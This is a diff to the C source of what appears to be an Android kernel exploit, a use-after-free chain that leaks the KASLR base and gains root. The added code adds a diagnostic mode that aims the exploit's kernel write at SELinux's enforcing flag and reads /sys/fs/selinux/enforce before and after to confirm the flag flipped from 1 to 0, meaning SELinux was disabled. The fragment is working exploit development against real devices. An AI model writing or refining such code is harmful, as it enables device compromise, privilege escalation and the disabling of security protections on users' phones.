@@ -322,7 +322,29 @@ int run_exploit(int argc, char **argv) {
    * The actual pi_blocked_on redirect will happen in consumer_thread
    * after the GhostLock trigger creates the dangling pointer.
    */
+  /* Bulletproof write-proof (ENFORCING_WRITE_DIAG=1): the rb-erase store is aimed
+   * at &selinux_state.enforcing instead of &ashmem_misc.fops (util.c). Read
+   * getenforce before/after: a 1->0 flip proves the chain-walk dequeue store
+   * actually executes on-device, isolating "walk doesn't write" from "wrong fops
+   * target/method". Uses the /sys/fs/selinux/enforce channel (always reliable). */
+  int enforce_diag = env_flag("ENFORCING_WRITE_DIAG", 0);
+  char enf_before[32] = "?";
+  if (enforce_diag) {
+    read_first_line("/sys/fs/selinux/enforce", enf_before, sizeof(enf_before));
+    pr_success("ckpt: ENFORCING_WRITE_DIAG target=%016llx enforce_before=%s\n",
+               (unsigned long long)data_addr(SELINUX_ENFORCING), enf_before);
+  }
+
   run_main_route_threads();
+
+  if (enforce_diag) {
+    char enf_after[32] = "?";
+    read_first_line("/sys/fs/selinux/enforce", enf_after, sizeof(enf_after));
+    pr_success("ckpt: ENFORCING_WRITE_DIAG enforce_before=%s enforce_after=%s "
+               "walk_wrote=%d\n",
+               enf_before, enf_after,
+               (int)(enf_after[0] == '0' && enf_before[0] != '0'));
+  }
 
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016llx slide=%016llx\n",
              getpid(), atomic_load(&cfi_stage_done), root_child_done,
